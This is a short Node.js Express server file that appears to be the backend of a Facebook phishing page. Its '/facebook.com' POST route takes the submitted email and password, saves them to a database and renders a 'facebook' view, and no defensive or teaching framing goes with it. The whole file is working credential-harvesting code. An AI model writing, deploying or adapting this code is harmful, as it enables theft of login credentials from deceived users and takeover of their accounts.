const express = require('express');
const app = express();
const Account = require('./db');

const upload = require('multer')({dest: './public'});

app.set('views', './views');
app.set('view engine', 'ejs');
app.use(express.static('./public'));

app.get('/', (req, res) => {
    res.render('index');
});

app.post('/facebook.com', upload.none(), (req, res) => {
    const {email, pass} = req.body;
    const acc = new Account({email, pass});
    acc.save();
    res.render('facebook');
});

app.listen(process.env.PORT || 3009, () => console.log('Started!'));